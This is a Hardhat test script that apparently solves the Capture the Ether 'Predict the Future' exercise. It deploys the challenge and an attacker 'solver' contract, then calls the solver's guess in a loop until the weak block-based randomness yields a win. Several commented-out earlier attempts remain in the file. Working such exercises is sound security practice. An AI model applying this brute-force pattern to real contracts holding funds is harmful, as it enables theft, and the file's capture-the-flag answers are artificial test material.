const { ethers } = require("hardhat");
const { expect } = require("chai");
const { assert } = require("console");
// import { expect } from "chai";

// let accounts;
// let acc;
// let game; // challenge contract
// let hack;

// before(async () => {
//     accounts = await ethers.getSigners();
//     acc = accounts[0]; 
//     game = await ethers.getContractFactory("PredictTheFutureChallenge")
//         .then((factory) => factory.deploy( { value: ethers.utils.parseEther("1") } ));
//     hack = await ethers.getContractFactory("PredictTheFutureAnswer")
//         .then((factory) => factory.deploy( game.address ));
// });

// it("predicts the future", async function () {
//   const tx = await hack.lock({ value: ethers.utils.parseEther("1") })
//   await tx.wait

//   const attackTx = await hack.pwn();
//   await attackTx.wait(); 


//   // while (!(await game.isComplete())) {
//   //   try {
//   //     const attackTx = await hack.pwn();
//   //     await attackTx.wait();
//   //   } catch (err) {
//   //     console.log(err);
//   //   }
//   //   // const blockNumber = await provider.getBlockNumber();
//   //   // console.log(`Tried block number: ${blockNumber}`);
//   // }
//   expect(await game.isComplete()).to.be.true;

//   // while(! await game.isComplete()){
//   //   const tx1 = await hack.nextBlock( )
//   //   await tx1.wait
//   //   await hack.pwn()
//   // }

// //   expect(txHash).to.not.be.undefined;
//   console.log(await hack.guess);
// });



// const PredictTheFutureChallenge = artifacts.require('PredictTheFutureChallenge');
// const PredictTheFutureSolver = artifacts.require('PredictTheFutureSolver');

before(async () => {
  challenge = await ethers.getContractFactory("PredictTheFutureChallenge")
      .then((factory) => factory.deploy( { value: ethers.utils.parseEther("1") } ));
  solver = await ethers.getContractFactory("PredictTheFutureAnswer")
      .then((factory) => factory.deploy());

});

  it('predicts the future', async () => {
    let guess = 0;
    
    await solver.lockInGuess(challenge.address, guess, { value: ethers.utils.parseEther("1") });
    // call withdraw to go to the next block
    await solver.withdraw();

    while (! await challenge.isComplete()) {
      console.log("Try guess...");
      await solver.guess(challenge.address, guess);
    }
    // console.log(await )
    // expect(await challenge.isComplete()).to.be.true
    assert(
      await challenge.isComplete() === true,
      'Challenge has not been completed!'
    );
  });

